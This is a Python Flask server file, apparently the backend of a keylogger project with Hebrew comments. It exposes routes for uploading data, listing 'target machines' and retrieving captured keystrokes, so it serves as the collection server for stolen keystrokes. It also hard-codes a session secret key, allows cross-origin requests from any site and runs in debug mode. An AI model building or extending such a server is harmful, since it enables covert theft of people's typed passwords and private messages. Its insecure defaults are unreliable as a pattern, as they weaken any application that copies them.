import os
from flask import Flask, render_template, request, send_from_directory, redirect, url_for, session
from flask_cors import CORS
from backend import controllers, services, utils

app = Flask(__name__, static_folder="../frontend", template_folder="../frontend")
CORS(app)

@app.get("/")
def home():
    return "KeyLogger Server is Running"

@app.post("/api/login")
def login():
    return controllers.handle_login(request)

@app.post("/api/notifications")
def notifications():
    return controllers.handle_notifications(request)

@app.get("/api/get_notifications")
def get_notifications():
    return controllers.handle_get_notifications()

@app.post("/api/delete_notification")
def delete_notifications():
    return controllers.handle_delete_notifications(request)

@app.post("/api/upload")
def upload():
    return controllers.handle_upload(request)

@app.get("/api/get_target_machines_list")
def get_machines():
    return controllers.handle_get_machines()

@app.get("/api/get_keystrokes")
def get_keystrokes():
    return controllers.handle_get_keystrokes(request)

@app.post("/api/update_settings")
def update_settings():
    return controllers.handle_update_settings(request)

@app.get("/api/get_settings")
def get_settings():
    return controllers.handle_get_settings()

app.secret_key = "a9s8d7f6g5h4j3k2l1qwertyZXCVBNM"  # מפתח סודי לשמירת session

@app.route("/home")
def home_page():
    if not session.get("user"):  # בדיקה אם המשתמש מחובר
        return redirect("/login")
    return render_template("index.html")

@app.route("/login")
def login_page():
    if session.get("user"):  # אם כבר מחובר, הפנה לדף הבית
        return redirect("/home")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect("/login")

@app.route("/js/<path:filename>")
def send_js(filename):
    return send_from_directory("../frontend/js", filename)

@app.route("/css/<path:filename>")
def send_css(filename):
    return send_from_directory("../frontend/css", filename)

if __name__ == "__main__":
    app.run(debug=True, port=5000)